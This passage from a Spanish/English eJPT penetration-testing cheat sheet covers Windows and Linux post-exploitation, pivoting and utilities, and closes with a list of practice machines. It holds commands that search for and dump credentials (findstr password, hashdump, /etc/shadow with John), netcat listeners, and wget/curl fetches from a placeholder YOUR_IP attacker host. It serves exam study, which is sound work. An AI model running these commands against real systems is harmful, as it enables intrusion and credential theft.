
<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-11.png" alt="Screenshot 86" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-12.png" alt="Screenshot 87" width="850">
</p>

<p align="center">
  <img src="assets/images/explotacion-web-y-servicios-comunes-step-13.png" alt="Screenshot 88" width="850">
</p>

</details>




# 🪟 Post-explotación Windows

Once a Windows session is obtained, the goal is to understand the user, privileges, system, network, and possible escalation paths.

## Enumeración inicial

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
net user
net localgroup
net localgroup administrators
```

## Qué revisar

| Element | Why it matters |
|---|---|
| User privileges | Some privileges enable escalation paths. |
| Local groups | They determine the real permissions within the system. |
| Windows version | It can be linked to known vulnerabilities. |
| Services | Misconfigured services can enable privilege escalation. |
| Sensitive files | Configs, backups, or scripts may contain credentials. |
| Internal network | It may reveal new machines or accessible segments. |

## Búsqueda de credenciales

```cmd
dir /s /b *password* *cred* *config*
findstr /si password *.txt *.ini *.config *.xml
cmdkey /list
```

## Meterpreter útil

```text
getuid
sysinfo
getprivs
ps
migrate PID
hashdump
```

> [!WARNING]
> Techniques such as hash dumping, token impersonation, or persistence should be limited to labs and explicit authorization. Always document what you did and why.

<details>
<summary><strong>📸 Windows post-exploitation screenshots</strong></summary>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-01.png" alt="Screenshot 89" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-02.png" alt="Screenshot 90" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-03.png" alt="Screenshot 91" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-04.png" alt="Screenshot 92" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-05.png" alt="Screenshot 93" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-06.png" alt="Screenshot 94" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-07.png" alt="Screenshot 95" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-08.png" alt="Screenshot 96" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-09.png" alt="Screenshot 97" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-windows-step-10.png" alt="Screenshot 98" width="850">
</p>

</details>




# 🐧 Post-explotación Linux

On Linux, local enumeration usually focuses on users, permissions, processes, services, scheduled tasks, and binaries with special permissions.

## Enumeración inicial

```bash
whoami
id
hostname
uname -a
ip a
ip route
sudo -l
cat /etc/passwd
find / -perm -4000 -type f 2>/dev/null
```

## Puntos clave

| Review | Command | What to look for |
|---|---|---|
| Sudo | `sudo -l` | Executable commands as root. |
| SUID | `find / -perm -4000 -type f 2>/dev/null` | Binaries with special permissions. |
| Cron | `cat /etc/crontab` | Scripts executed automatically. |
| Processes | `ps aux` | Services and commands with credentials. |
| Local ports | `ss -tulpn` | Internal services not exposed externally. |
| History | `history` | Previous commands with routes or secrets. |
| Files | `find / -name "*.conf" 2>/dev/null` | Configurations with credentials. |

## Hashes en Linux

```bash
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

`/etc/shadow` requires elevated privileges. In labs, if you can obtain both files, you can combine them to attempt offline cracking.

<details>
<summary><strong>📸 Linux post-exploitation screenshots</strong></summary>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-01.png" alt="Screenshot 99" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-02.png" alt="Screenshot 100" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-03.png" alt="Screenshot 101" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-04.png" alt="Screenshot 102" width="850">
</p>

<p align="center">
  <img src="assets/images/post-explotacion-linux-step-05.png" alt="Screenshot 103" width="850">
</p>

</details>




# 🔁 Pivoting y movimiento en red

Pivoting means using a compromised machine as a support point to reach internal networks that are not directly accessible.

## Conceptos importantes

| Concept | Explanation |
|---|---|
| Internal route | Additional network visible from the compromised machine. |
| Port forwarding | Redirect a remote port to your machine. |
| SOCKS proxy | Channel tools through a session. |
| Autoroute | Add routes in Metasploit to reach internal networks. |

## Comandos orientativos en Meterpreter

```text
ipconfig
route print
run autoroute -s 10.10.20.0/24
background
use auxiliary/server/socks_proxy
run
```

Then you can configure tools to pass through the proxy if the lab requires it.



# 🧰 Utilidades prácticas

## Banner grabbing

```bash
nc -nv IP PORT
curl -I http://IP
nmap -sV -pPORT IP
```

Banner grabbing tries to obtain direct information from the service: version, product, headers, or welcome messages.

## Searchsploit

```bash
searchsploit apache 2.4
searchsploit samba 3.0.20
searchsploit -m path/to/exploit
```

Searchsploit allows you to search for local exploits in Exploit-DB. Before using any exploit, read the code, understand the requirements, and verify that it applies to your version.

## Netcat

```bash
nc -lvnp 4444
nc -nv IP 4444
```

Netcat is used for listeners, simple TCP connections, basic file transfer, and quick connectivity tests.

## Compartir archivos

```bash
python3 -m http.server 8000
wget http://YOUR_IP:8000/file
curl -O http://YOUR_IP:8000/file
```

In labs, it is common to start a temporary HTTP server to transfer tools, scripts, or evidence between machines.

## Mejorar una shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```

An interactive shell improves the use of commands such as `su`, editors, autocompletion, and terminal signals.

## Nikto

```bash
nikto -h http://IP
nikto -h http://IP -o report.html -Format htm
```

Nikto automates basic web checks. Use it as support, not as a substitute for manually reviewing routes, headers, and application behavior.

## WPScan

```bash
wpscan --url http://IP --enumerate u,p,t
wpscan --url http://IP --api-token TOKEN
wpscan --update
```

WPScan enumerates WordPress, plugins, themes, and users. Updating the database improves detection of known vulnerabilities.

<details>
<summary><strong>📸 Final utility screenshots</strong></summary>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-01.png" alt="Screenshot 104" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-02.png" alt="Screenshot 105" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-03.png" alt="Screenshot 106" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-04.png" alt="Screenshot 107" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-05.png" alt="Screenshot 108" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-06.png" alt="Screenshot 109" width="850">
</p>

<p align="center">
  <img src="assets/images/utilidades-practicas-step-07.png" alt="Screenshot 110" width="850">
</p>

</details>




# 📝 Plantilla de documentación

The complete template for documenting machines, CTFs, and labs is separated into `LAB_TEMPLATE.md` to keep the README as the main cheatsheet.

📄 **File:** [`LAB_TEMPLATE.md`](LAB_TEMPLATE.md)

Use it to record general information, reconnaissance, enumeration, exploitation, privilege escalation, evidence, useful commands, and lessons learned.



# ✅ Notas finales

- Enumerate before exploiting.
- Always save relevant output with `-oA`, screenshots, or logs.
- Do not run exploits without reading them first.
- Reuse credentials only within the lab and document where they appeared.
- Maintain a clear methodology: every finding should justify the next step.



## 🧭 Plantilla para examen eJPT

This repository also includes a specific template to organize an exam environment with several machines, topologies, internal networks, credentials, evidence, and possible pivoting routes.

📄 **File:** [`EJPT_EXAM_TEMPLATE.md`](EJPT_EXAM_TEMPLATE.md)

Use it as a working notebook during labs or exam simulations so you do not lose important information between hosts.



# 🧪 Máquinas recomendadas para practicar eJPT

<p align="center">
  <img src="assets/images/writeups-ctf-solutions-cover.png" alt="Writeups and CTF Solutions cover" width="850">
</p>

In addition to theory and commands, one of the best ways to prepare for eJPT is to practice with vulnerable machines. Below is a selection of machines documented by me that cover techniques very aligned with the exam: enumeration, web exploitation, SMB, FTP, SSH, weak credentials, reverse shells, privilege escalation, and basic pivoting.

| Machine | Platform | Level | Main techniques | Why it helps for eJPT | Solution |
|---|---|---|---|---|---|
| FirstHacking | DockerLabs | Very Easy | Vulnerable FTP, Metasploit, initial access, direct root. | Good for practicing basic exploitation with Metasploit and understanding how to validate vulnerable services. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/firsthacking/README.md) |
| Trust | DockerLabs | Very Easy | Web enumeration, brute force, SSH, sudo. | Reinforces the classic eJPT flow: enumerate, find credentials, access via SSH, and escalate privileges. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/trust/README.md) |
| BreakMySSH | DockerLabs | Very Easy | Enumeration, brute force, hash cracking, SSH. | Helps practice weak credentials, remote access, and user validation. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/breakmyssh/README.md) |
| WalkingCMS | DockerLabs | Easy | WordPress, web enumeration, brute force, theme editing, reverse shell, SUID. | Very useful for practicing CMS exploitation, initial web access, and privilege escalation on Linux. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/walkingcms/README.md) |
| AnonymousPingu | DockerLabs | Easy | Anonymous FTP, Apache, file upload, web shell, reverse shell, sudo/GTFOBins. | Works on a very typical lab vector: misconfigured service, file upload, and escalation via permissions. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/AnonymousPingu/README.md) |
| Backend | DockerLabs | Easy | SQL Injection, sqlmap, credentials, SSH, SUID, John the Ripper. | Reinforces web exploitation, credential retrieval, and basic hash cracking. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/backend/README.md) |
| FindYourStyle | DockerLabs | Easy | Drupal, Drupalgeddon2, credentials in configuration, sudo, grep/ls. | Allows practice with CMS identification, exploitation of known vulnerabilities, and basic post-exploitation. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/findyourstyle/README.md) |
| Dance-Samba | DockerLabs | Medium | FTP, SMB, SSH, weak credentials, SSH Key Injection, sudo. | Particularly useful for eJPT because it combines several common services and forces correlation between them. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/dance-samba/README.md) |
| Domain | DockerLabs | Medium | HTTP, SMB, user enumeration, controlled brute force, reverse shell upload, SUID. | Very good for practicing SMB enumeration, credential reuse, and exploitation of shared resources. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/domain/README.md) |
| Vulnerame | DockerLabs | Hard | Joomla, information disclosure, MySQL, hash cracking, admin panel, reverse shell, sudo. | More advanced, but useful for putting several full phases together: web, database, credentials, initial access, and escalation. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/DockerLabs/vulnerame/README.md) |
| Cap | HackTheBox | Easy | IDOR, traffic analysis, reused credentials, Linux capabilities. | Excellent for practicing evidence analysis, credential reuse, and escalation via capabilities. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/HackTheBox/Facil/Cap/README.md) |
| Neighbour | TryHackMe | 5 minutes | Credentials in source code, IDOR, parameter manipulation. | Ideal for reinforcing basic web enumeration and simple logical flaws. | [See write-up](https://github.com/saulruizplaza/WriteUps-CTF-Solutions/blob/main/TryHackme/5_minutos/Neighbour/README.md) |

## Ruta recomendada de práctica

1. FirstHacking
2. Trust
3. BreakMySSH
4. AnonymousPingu
5. WalkingCMS
6. Backend
7. FindYourStyle
8. Dance-Samba
9. Domain
10. Cap
11. Vulnerame

If you are starting out, the ideal approach is to follow this order to move from basic enumeration and simple exploitation to scenarios with multiple services, reused credentials, CMS, SQL injection, SMB, and more complete privilege escalation.

> [!NOTE]
> These machines do not replace the official eJPT labs, but they are a good way to reinforce methodology, documentation, and technical practice before the exam.

## <img src="./assets/images/logoactual.jpg" width=25 style="; border-radius:50%;"> ¡Hola! Me llamo Saúl Ruiz

### Analista de Ciberseguridad | Seguridad Ofensiva y Pentesting

![YouTube](https://img.shields.io/youtube/channel/subscribers/UCcOkvgreZrXauRHyXlii0JA)
![Seguidores](https://img.shields.io/github/followers/saulruizplaza)
[![Twitter Follow](https://img.shields.io/twitter/follow/plasysx?style=social)](https://twitter.com/plasysx)

I am a Cybersecurity Analyst and Higher Technician in Networked Computer Systems Administration. I am currently developing my career in SOC environments, participating in tasks of analysis, monitoring, and investigation of security events.

My main interest is oriented toward offensive security, pentesting, and technical analysis, areas in which I continue to train constantly to grow professionally within the sector.

Through my personal project <b>[@PlaSysX](https://linktr.ee/PlaSysx)</b>, I share content related to IT, cybersecurity, and hands-on learning, with the goal of adding value to those who also want to continue growing in the technological world.

[![Website](https://img.shields.io/badge/Website-plasysx.com-7B3FF2?style=for-the-badge&logo=google-chrome&logoColor=white&labelColor=101010)](https://plasysx.com)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Saúl_Ruiz_Plaza-0077B5?style=for-the-badge&logo=linkedin&logoColor=white&labelColor=101010)](https://www.linkedin.com/in/saulruizplaza) [![Instagram](https://img.shields.io/badge/Instagram-@PlaSysX-E4405F?style=for-the-badge&logo=instagram&logoColor=white&labelColor=101010)](https://instagram.com/plasysx)
[![TikTok](https://img.shields.io/badge/TikTok-@plasysx_es-69C9D0?style=for-the-badge&logo=tiktok&logoColor=white&labelColor=101010)](https://tiktok.com/@plasysx_es)
[![YouTube](https://img.shields.io/badge/YouTube-Plasysx-FF0000?style=for-the-badge&logo=youtube&logoColor=white&labelColor=101010)](https://youtube.com/@Plasysx)
[![Twitter](https://img.shields.io/badge/Twitter-@plasysx-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white&labelColor=101010)](https://twitter.com/plasysx)
